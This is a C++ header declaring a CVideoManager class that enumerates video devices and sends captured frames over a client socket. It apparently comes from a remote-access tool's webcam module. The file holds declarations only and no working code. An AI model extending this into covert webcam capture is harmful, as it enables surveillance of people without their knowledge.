// VideoManager.h: interface for the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_VIDEOMANAGER_H__F8A0798C_6186_45DE_BA4F_277D925FFB1B__INCLUDED_)
#define AFX_VIDEOMANAGER_H__F8A0798C_6186_45DE_BA4F_277D925FFB1B__INCLUDED_
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
#include "CaptureVideo.h"

class CVideoManager  : public CManager 
{
public:
	CVideoManager(CClientSocket *pClient);
	virtual ~CVideoManager();
    void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CCaptureVideo *m_pCapVideo;
	std::string m_DeviceList; // 驱动器列表

	BOOL m_bIsWorking;
	HANDLE	m_hWorkThread;
	static DWORD WINAPI WorkThread(LPVOID lparam);
	bool Initialize();
	void Destroy();

	void sendBITMAPINFO();
	void sendNextScreen();
	void ResetScreen(int nWidth, int nHeight);

	int m_nDevicesNum; //视频设备驱动数
	int	m_nVedioWidth;
	int	m_nVedioHeight;
	int m_nOldWidth;
	int m_nOldHeight;
	int	m_SelectedDevice;
	int	m_SelectedOld;
};

#endif // !defined(AFX_VIDEOMANAGER_H__F8A0798C_6186_45DE_BA4F_277D925FFB1B__INCLUDED_)
